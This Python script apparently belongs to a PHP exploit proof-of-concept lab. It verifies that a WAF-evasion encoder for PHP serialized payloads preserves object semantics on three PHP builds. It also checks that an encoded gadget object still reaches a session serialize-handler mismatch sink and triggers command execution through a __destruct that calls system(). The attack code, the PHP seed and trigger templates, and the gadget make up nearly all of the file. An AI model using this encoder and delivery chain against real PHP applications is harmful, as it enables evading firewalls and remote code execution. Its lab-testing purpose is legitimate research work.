#!/usr/bin/env python3
"""Verifier for the WAF-evasion serialize encoder (waf_serialize.py).

Round-trips the encoded payloads through real PHP builds and asserts:

  A. SEMANTICS PRESERVED -- `serp_hex` output unserialize()s to the identical
     object/string as the plain form, on 8.3.35 / 8.4.26 / 8.5.12.

  B. DELIVERY-SINK SURVIVAL -- a `serp_hex`-encoded gadget object still flows
     through the `php` session decoder (the handler-mismatch trigger sink) and
     instantiates on 8.5.12.

  C. REGRESSION GUARD (negative) -- the `plus_len` `O:+N:` / `s:+N:` leading-'+'
     trick is REJECTED (unserialize -> false) on all three builds, confirming it
     is correctly NOT emitted by the encoder.

Host-run (lab images have no python3); drives `php` in the lab containers.

Usage:
    python3 -I poc/primitives/tooling/verify_waf_serialize.py
    python3 -I poc/primitives/tooling/verify_waf_serialize.py --only 512
"""
from __future__ import annotations

import argparse
import base64
import os
import re
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import waf_serialize as ws

BUILDS = {
    "512": {"container": "php2shell-fbt-8103", "label": "8.5.12", "patched": True},
    "426": {"container": "php2shell-cli-vuln-1", "label": "8.4.26", "patched": False},
    "835": {"container": "php2shell-cli-vuln83-1", "label": "8.3.35", "patched": False},
}

# Reads base64 payload from env P, unserializes, prints a canonical description.
RT_PHP = r"""<?php
class Logger { public $cmd; function __destruct(){} }
$r = @unserialize(base64_decode(getenv('P')));
if ($r === false) { echo "FALSE"; }
elseif (is_object($r)) { echo "OBJ ".get_class($r)." cmd=".(isset($r->cmd)?$r->cmd:'<none>'); }
elseif (is_string($r)) { echo "STR:".$r; }
else { echo "OTHER"; }
"""

# Handler-mismatch delivery sink, as two separate requests/processes (the real
# delivery is a seed request then a trigger request; one process cannot switch
# the handler after session_write_close sends headers). Both share SINK_SP.
SINK_SP = "/tmp/waf_sink_sess"
SINK_SID = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
SINK_SEED_TMPL = r"""<?php
$sp='%s'; @mkdir($sp);
ini_set('session.save_path',$sp); ini_set('session.use_strict_mode','0');
ini_set('session.serialize_handler','php_serialize');
session_id('%s'); session_start();
$_SESSION=array(); $_SESSION['upload_progress_|'.base64_decode(getenv('O')).';TG']=array('x'=>1);
session_write_close();
echo "SEED_DONE";
""" % (SINK_SP, SINK_SID)
SINK_TRIG_TMPL = r"""<?php
class Logger { public $cmd; function __destruct(){ echo "SINK_RCE:"; system($this->cmd); } }
$sp='%s';
ini_set('session.save_path',$sp); ini_set('session.use_strict_mode','0');
ini_set('session.serialize_handler','php');
session_id('%s'); @session_start();
echo "SINK_DONE";
""" % (SINK_SP, SINK_SID)


from common.labharness import container_up  # noqa: E402


def _php(container: str, script: str, env: dict) -> str:
    cmd = ["docker", "exec", "-i"]
    for k, v in env.items():
        cmd += ["-e", f"{k}={v}"]
    cmd += [container, "php", "/dev/stdin"]
    r = subprocess.run(cmd, input=script, capture_output=True, text=True)
    return (r.stdout + r.stderr).replace("\r", "").strip()


def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8", "surrogateescape")).decode()


def _unser(container: str, payload: str) -> str:
    return _php(container, RT_PHP, {"P": _b64(payload)})


def run_build(key: str) -> bool:
    b = BUILDS[key]
    c = b["container"]
    print(f"\n######## PHP {b['label']}  ({c}) ########", flush=True)
    if not container_up(c):
        print(f"[skip] container {c} not running.")
        return None

    obj_plain = ws.php_object("Logger", {"cmd": "id"})
    obj_hex = ws.encode(obj_plain, "serp_hex")
    str_plain = ws.php_str("cmd") + ";"
    str_hex = ws.serp_hex(str_plain)
    # plus_len as the upstream EXP builds it (class-name length gets the '+').
    obj_plus = re.sub(r"([OC]):(\d+):", lambda m: "%s:+%s:" % (m.group(1), m.group(2)), obj_plain)
    str_plus = re.sub(r"s:(\d+):", r"s:+\1:", str_plain)

    checks = []

    # A. semantics preserved
    base = _unser(c, obj_plain)
    hexd = _unser(c, obj_hex)
    ok_a1 = base == hexd == "OBJ Logger cmd=id"
    checks.append(("A: serp_hex object == plain object", ok_a1, f"plain={base!r} hex={hexd!r}"))
    s_base = _unser(c, str_plain)
    s_hex = _unser(c, str_hex)
    ok_a2 = s_base == s_hex == "STR:cmd"
    checks.append(("A: serp_hex string == plain string", ok_a2, f"plain={s_base!r} hex={s_hex!r}"))

    # B. serp_hex survives the php session-decoder delivery sink (two processes:
    #    php_serialize seed request, then `php`-handler trigger request).
    subprocess.run(["docker", "exec", c, "rm", "-rf", SINK_SP], capture_output=True)
    _php(c, SINK_SEED_TMPL, {"O": _b64(obj_hex)})
    sink = _php(c, SINK_TRIG_TMPL, {})
    ok_b = "SINK_RCE:uid=" in sink and "SINK_DONE" in sink and sink.index("SINK_RCE") < sink.index("SINK_DONE")
    rce = sink.split("SINK_RCE:", 1)[1].splitlines()[0] if "SINK_RCE:" in sink else "(no __destruct)"
    checks.append(("B: serp_hex object fires __destruct via php session decoder", ok_b, rce))

    # C. regression guard -- plus_len must be REJECTED
    p_obj = _unser(c, obj_plus)
    p_str = _unser(c, str_plus)
    ok_c = p_obj == "FALSE" and p_str == "FALSE"
    checks.append(("C: plus_len (O:+N:/s:+N:) rejected (dead primitive)", ok_c,
                   f"obj={p_obj!r} str={p_str!r}"))

    allok = True
    for name, ok, detail in checks:
        print(f"  [{'PASS' if ok else 'FAIL'}] {name}  -- {detail}")
        allok = allok and ok
    return allok


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(description="Verify the WAF-evasion serialize encoder vs real PHP.")
    ap.add_argument("--only", choices=list(BUILDS), default=None)
    args = ap.parse_args(argv)

    keys = [args.only] if args.only else list(BUILDS)
    allpass = True
    ran_any = False
    for k in keys:
        res = run_build(k)
        if res is not None:
            ran_any = True
            allpass = allpass and res

    print("\n==== WAF-evasion serialize encoder verdict ====")
    if not ran_any:
        print("  no builds ran -- bring up the lab (docker compose up -d; "
              "docker compose -f docker-compose.apache-avenues.yml -p p2s-fbt "
              "--profile fbt up -d --build).")
        return 2
    print(f"  {'ALL PASS -- serp_hex semantics+sink confirmed, plus_len correctly excluded' if allpass else 'FAIL -- see above'}")
    return 0 if allpass else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
